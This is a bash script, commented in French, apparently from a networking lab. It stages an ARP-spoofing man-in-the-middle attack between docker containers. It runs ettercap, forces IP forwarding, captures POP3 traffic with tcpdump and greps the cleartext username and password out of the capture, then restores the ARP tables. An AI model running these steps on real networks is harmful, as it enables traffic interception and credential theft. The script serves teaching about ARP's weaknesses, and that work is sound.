#!/bin/bash
# Points 6 et 7 du sujet : ARP, ARP spoofing, homme au milieu, capture.
# A lancer depuis l'HOTE, a la racine du projet :
#   bash tests/test-attaque.sh
#
# Le script fait la demonstration complete : capture avant, empoisonnement,
# capture apres, extraction du mot de passe, puis remise en etat.

set -u

SERVEUR="${IP_SERVEUR:-10.99.0.10}"
CLIENT="${IP_CLIENT:-10.99.0.20}"
ATTAQUANT="${IP_ATTAQUANT:-10.99.0.30}"

dc() { docker compose exec -T "$@"; }
titre() { echo; echo "=========== $* ==========="; }

titre "Point 6.b : lire et manipuler la table ARP du client"
dc client ping -c1 -W1 "${SERVEUR}" >/dev/null 2>&1
echo "--- arp -n (lister les lignes) ---"
dc client arp -n
echo "--- arp -d ${SERVEUR} (enlever une ligne) ---"
dc client arp -d "${SERVEUR}"
dc client arp -n
echo "La ligne repart d'elle meme au prochain ping : ARP n'a aucune memoire"
echo "persistante et aucune authentification. C'est toute la faiblesse."

titre "Point 6.c/6.d : proxy ARP sur l'attaquant"
dc attaquant sh -c 'echo 1 > /proc/sys/net/ipv4/conf/eth0/proxy_arp'
echo "proxy_arp = $(dc attaquant cat /proc/sys/net/ipv4/conf/eth0/proxy_arp)"
echo "Avec proxy_arp, l'attaquant repond aux requetes ARP pour des adresses"
echo "qui ne sont pas les siennes. C'est le mecanisme legitime dont l'ARP"
echo "spoofing est la version malveillante."

titre "MAC reelles avant l'attaque"
echo "serveur   ${SERVEUR}  -> $(dc serveur   cat /sys/class/net/eth0/address)"
echo "client    ${CLIENT}  -> $(dc client    cat /sys/class/net/eth0/address)"
echo "attaquant ${ATTAQUANT}  -> $(dc attaquant cat /sys/class/net/eth0/address)"

titre "Point 7.a : capture AVANT l'attaque"
echo "L'attaquant ecoute pendant que le client fait une session POP3."
docker compose exec -d attaquant sh -c \
  "timeout 12 tcpdump -i eth0 -n 'tcp port 110' -w /tmp/avant.pcap 2>/dev/null"
sleep 2
dc client sh -c "printf 'USER alice\r\nPASS alice\r\nSTAT\r\nQUIT\r\n' | timeout 8 nc -q2 ${SERVEUR} 110" >/dev/null 2>&1
sleep 11
AVANT=$(dc attaquant sh -c 'tcpdump -r /tmp/avant.pcap -n 2>/dev/null | wc -l')
echo ">>> paquets POP3 vus par l'attaquant AVANT : ${AVANT}"
echo "Zero, et c'est la reponse a la question du sujet : le bridge se comporte"
echo "comme un commutateur, il n'envoie la trame qu'au port du destinataire."

titre "Point 7.b/7.d : attaque homme au milieu par ARP spoofing"
echo "ettercap -T -q -i eth0 -M arp:remote /${CLIENT}// /${SERVEUR}//"
docker compose exec -d attaquant sh -c \
  "ettercap -T -q -i eth0 -M arp:remote /${CLIENT}// /${SERVEUR}// > /tmp/ettercap.log 2>&1"
sleep 8

# ettercap remet ip_forward a 0 pour relayer lui meme en espace utilisateur.
# Ce relais ne fonctionne pas ici : les SYN sont interceptes mais jamais
# transmis, et la session TCP du client reste bloquee. On rend donc la main
# au noyau. Sans cette ligne l'attaque coupe le trafic au lieu de l'espionner.
dc attaquant sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
echo "ip_forward force a $(dc attaquant cat /proc/sys/net/ipv4/ip_forward) (ettercap l'avait remis a 0)"

echo "--- table ARP du client PENDANT l'attaque ---"
dc client arp -n
echo "--- table ARP du serveur PENDANT l'attaque ---"
dc serveur arp -n
echo ">>> Les deux machines croient que l'autre a la MAC de l'attaquant."

titre "Point 7.e : capture PENDANT l'attaque"
docker compose exec -d attaquant sh -c \
  "timeout 20 tcpdump -i eth0 -n 'tcp port 110 or tcp port 23' -w /tmp/apres.pcap 2>/dev/null"
sleep 3
dc client sh -c "printf 'USER alice\r\nPASS alice\r\nSTAT\r\nRETR 1\r\nQUIT\r\n' | timeout 12 nc -q2 ${SERVEUR} 110" >/dev/null 2>&1
sleep 16
APRES=$(dc attaquant sh -c 'tcpdump -r /tmp/apres.pcap -n 2>/dev/null | wc -l')
echo ">>> paquets vus par l'attaquant APRES : ${APRES}"
echo "--- identifiants extraits en clair (Follow TCP Stream) ---"
dc attaquant sh -c "tcpdump -r /tmp/apres.pcap -n -A 2>/dev/null | grep -aE '^(USER|PASS) ' | sort -u"

titre "Remise en etat"
dc attaquant pkill -INT ettercap 2>/dev/null || true
sleep 6
echo "--- table ARP du client apres l'arret d'ettercap ---"
dc client arp -n
echo "ettercap reemet les vraies associations en quittant."

titre "Resume pour le compte rendu"
echo "Avant l'attaque : ${AVANT} paquet(s) vus par l'attaquant."
echo "Pendant        : ${APRES} paquet(s), dont le mot de passe POP3 en clair."
echo "Les pcap sont dans le conteneur attaquant, /tmp/avant.pcap et /tmp/apres.pcap."
echo "Pour les ouvrir dans Wireshark sur l'hote :"
echo "  docker compose cp attaquant:/tmp/apres.pcap ."
